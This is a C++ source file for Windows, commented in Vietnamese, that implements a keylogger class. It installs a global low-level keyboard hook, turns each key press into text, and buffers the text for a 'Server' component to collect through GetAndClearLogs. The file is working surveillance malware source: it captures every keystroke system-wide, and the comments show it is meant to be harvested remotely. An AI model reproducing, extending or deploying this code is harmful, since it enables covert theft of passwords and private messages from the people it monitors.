#include "KeyLogger.h"

// --- BIẾN TOÀN CỤC ---
HHOOK hHook = NULL;
KeyLogger* g_LoggerInstance = nullptr; // THÊM: Con trỏ trỏ về đối tượng logger hiện tại

// --- HÀM CALLBACK CỦA WINDOWS ---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;

        // KIỂM TRA: Nếu có instance logger thì gọi hàm xử lý của nó
        if (g_LoggerInstance != nullptr) {
            g_LoggerInstance->OnKeyPressed(key);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// --- CÁC HÀM TRONG CLASS KEYLOGGER ---

// 1. Hàm xử lý khi có phím nhấn (Được gọi từ KeyboardProc)
void KeyLogger::OnKeyPressed(int key) {
    // Format phím thành chuỗi
    std::string keyStr = logKeystroke(key);

    // KHÓA LUỒNG (QUAN TRỌNG): Để tránh xung đột với Server khi đang đọc
    std::lock_guard<std::mutex> lock(bufferMutex);
    buffer.push_back(keyStr);
}

// 2. Hàm cho Server lấy dữ liệu
std::vector<std::string> KeyLogger::GetAndClearLogs() {
    std::lock_guard<std::mutex> lock(bufferMutex);

    // Sao chép dữ liệu ra biến tạm
    std::vector<std::string> data = buffer;

    // Xóa sạch buffer cũ để đón phím mới
    buffer.clear();

    return data; // Trả về dữ liệu đã lấy
}

// 3. Hàm định dạng chuỗi (Logic của bạn)
std::string KeyLogger::logKeystroke(int key) {
    if (key == VK_BACK) return "[BACKSPACE]";
    else if (key == VK_RETURN) return "[ENTER]";
    else if (key == VK_SPACE) return " ";
    else if (key == VK_TAB) return "[TAB]";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) return ""; // Thường không log Shift riêng lẻ
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) return "[CTRL]";
    else if (key == VK_ESCAPE) return "[ESC]";
    else if (key >= 'A' && key <= 'Z') return std::string(1, char(key));
    else if (key >= '0' && key <= '9') return std::string(1, char(key));
    // Có thể thêm logic xử lý Capslock để viết hoa/thường nếu cần
    else return "[UNK]";
}

// 4. Luồng chạy Hook
void KeyLogger::WorkerThread() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hHook == NULL) return;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (!isRunning) break;
    }

    UnhookWindowsHookEx(hHook);
    hHook = NULL;
}

// 5. Start
void KeyLogger::Start() {
    if (isRunning) return;

    // Gán con trỏ toàn cục vào chính đối tượng này
    g_LoggerInstance = this;

    isRunning = true;
    hookThread = std::thread(&KeyLogger::WorkerThread, this);
}

// 6. Stop
void KeyLogger::Stop() {
    if (!isRunning) return;
    isRunning = false;

    // Hủy con trỏ toàn cục
    g_LoggerInstance = nullptr;

    if (hookThread.joinable()) {
        PostThreadMessage(GetThreadId(hookThread.native_handle()), WM_QUIT, 0, 0);
        hookThread.join();
    }
}